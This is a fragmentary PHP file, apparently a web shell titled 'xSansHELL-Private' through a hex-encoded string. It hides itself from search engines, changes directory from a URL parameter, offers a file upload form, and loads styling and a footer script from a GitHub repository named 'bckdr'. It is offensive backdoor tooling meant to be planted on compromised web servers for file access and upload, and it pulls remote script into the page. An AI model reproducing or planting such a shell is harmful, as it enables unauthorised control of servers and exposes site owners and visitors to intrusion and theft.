...
$sname       = "\x78\x53\x61\x6e\x73\x48\x45\x4c\x4c" . "-Private";
...
echo '<!DOCTYPE html><html><head><meta name="robots" content"noindex. nofollow"><link href="https://fonts.googleapis.com/css2?family=Grenze+Gotisch" rel="stylesheet"><title>'.$sname.'</title><script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script><link href="//raw.githubusercontent.com/xSanzbm/bckdr/master/inc/m1n1.css" rel="stylesheet" type="text/css"></head><body>';

echo '<div style="color:#00efdb;margin-top:0;"><h1><center>' . $sname . '</center></h1></div>';
if (isset($_GET['path'])) {
    $path = $_GET['path'];
    chdir($_GET['path']);
} else {
...
echo '<br>[ <a href="?">Home</a> ]</font></td><td align="center" width="27%"><form enctype="multipart/form-data" method="POST"><input type="file" name="file" style="color:#00efdb;margin-bottom:4px;"/><input type="submit" value="Upload" /></form></td></tr><tr><td colspan="2">';
...
echo '<script type="text/javascript" src="//raw.githubusercontent.com/xSanzbm/bckdr/master/inc/footer.js"></script>';
echo '</body></html><!-- EOF -->';
?>